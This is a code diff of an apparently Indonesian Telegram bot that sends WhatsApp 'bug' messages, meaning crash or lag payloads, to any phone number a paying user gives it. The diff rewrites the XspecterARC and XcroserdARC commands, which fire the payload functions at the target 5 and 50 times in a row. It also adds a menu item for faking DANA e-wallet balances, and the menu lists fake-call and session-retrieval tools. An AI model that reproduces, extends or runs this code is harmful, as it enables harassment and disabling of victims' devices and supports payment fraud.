@@ -755,9 +755,11 @@ bot.action("page3", async (ctx) => {
 │◆ Gunakan Command Di Bawah! 
 ╰────────────────────╼
 🚫 Jangan Salah Menggunakan Script Bug Ini 🚫
-╭───⊱( 🦄 ) Tools° - Menu
+╭───⊱( 🎯 ) Tools° - Menu
 │⬡ /csessions
 │╰┈➤ Retrieving Sessions 
+│⬡ /fakedana
+│╰┈➤ Membuat Jumlah Uang Dana Palsu
 │⬡ /fakecall
 │╰┈➤ Telepon Palsu
 │⬡ /xpair
@@ -2829,127 +2831,56 @@ bot.command("XdelayARC", checkPremium, checkCooldown, checkWhatsAppConnection, a
 );
 // ` Case Bug 5 ` \\
 bot.command("XspecterARC", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
-    const q = ctx.message.text.split(" ")[1];
-    const userId = ctx.from.id;
-    const chatId = ctx.chat.id;
-    const date = getCurrentDate();
-  
-    if (!q) {
-      return ctx.reply(`❌ Format : /XspecterARC 62xx`);
-    }
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply("🪧 ☇ Example : /XspecterARC 62xx");
 
-    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-    // Kirim pesan proses dimulai dan simpan messageId-nya
-    const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/3lqzoj.jpg",
-      {
-        caption: `
-<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>
+  await ctx.reply(
 
-⬡ ターゲット : ${q}
-⬡ タイプ バグ : XspecterARC 30%
-⬡ バグステータス : Process
-⬡ デイデイト  : ${date}
+`
+✅ SUCCES SEND BUGS : ${q}`,
+  {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}`, style: "success" }],
+      ],
+    },
+  });
 
-<blockquote><code>© pinn. 𖣂 .Xopz</code></blockquote>
-`,
-        parse_mode: "HTML",
-      }
-    );
-
-    
-    console.log(chalk.white(`Process Sending Bugs To ${target}`));
-
-    for (let i = 0; i < 20; i++) {
-      await CStatus(sock, target);
-      await sleep(100)
-      console.log(chalk.magenta(`Succes Sending Bugs To ${target}`));
-    }
-
-    await ctx.editMessageCaption(
-      `
-<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>
-
-⬡ ターゲット : ${q}
-⬡ タイプ バグ : XspecterARC 30% 
-⬡ バグステータス : Succes Sending Bugs
-⬡ デイデイト  : ${date}
-
-<blockquote><code>© pinn. 𖣂 .Xopz</code></blockquote>
-`,
-      {
-        chat_id: chatId,
-        message_id: sentMessage.message_id,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }],
-          ],
-        },
-      }
-    );
+  for (let i = 0; i < 5; i++) {
+    await CStatus(sock, target);
+    await sleep(100);
+    console.log(`Succes Sending Bugs To : ${target}`);
   }
-);
+})
 // ~ Case Bug 6 ~ \\
 bot.command("XcroserdARC", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
-    const q = ctx.message.text.split(" ")[1];
-    const userId = ctx.from.id;
-    const chatId = ctx.chat.id;
-    const date = getCurrentDate();
-                 
-    if (!q) {
-      return ctx.reply(`❌ Format : /XcroserdARC 62xx`);
-    }
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply("🪧 ☇ Example : /XcroserdARCs 62xx");
 
-    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-    const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/3lqzoj.jpg",
-      {
-        caption: `
-<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>
+  await ctx.reply(
 
-⬡ ターゲット : ${q}
-⬡ タイプ バグ : Croserd 
-⬡ バグステータス : Proccesing
-⬡ デイデイト  : ${date}
+`
+✅ SUCCES SEND BUGS : ${q}`,
+  {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}`, style: "success" }],
+      ],
+    },
+  });
 
-<blockquote><code>© pinn. 𖣂 .Xopz</code></blockquote>
-`,
-        parse_mode: "HTML",
-      }
-    );
-
-    
-    console.log(chalk.white(`Process Sending Bugs To ${target}`));
-    for (let i = 0; i < 50; i++) {
-      await xclowerz(sock, target);
-      await sleep(500)
-    }
-
-    await ctx.editMessageCaption(
-      `
-<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>
-
-⬡ ターゲット : ${q}
-⬡ タイプ バグ : Croserd Andro
-⬡ バグステータス : Succes Sending Bugs
-⬡ デイデイト  : ${date}
-
-<blockquote><code>© pinn. 𖣂 .Xopz</code></blockquote>
-`,
-      {
-        chat_id: chatId,
-        message_id: sentMessage.message_id,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }],
-          ],
-        },
-      }
-    );
+  for (let i = 0; i < 50; i++) {
+    await xclowerz(sock, target);
+    await sleep(1000);
+    console.log(`Succes Sending Bugs To : ${target}`);
   }
-);
+})
 // ~ Case Bug 7 ~ \\
 bot.command("XghostARC", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const q = ctx.message.text.split(" ")[1];
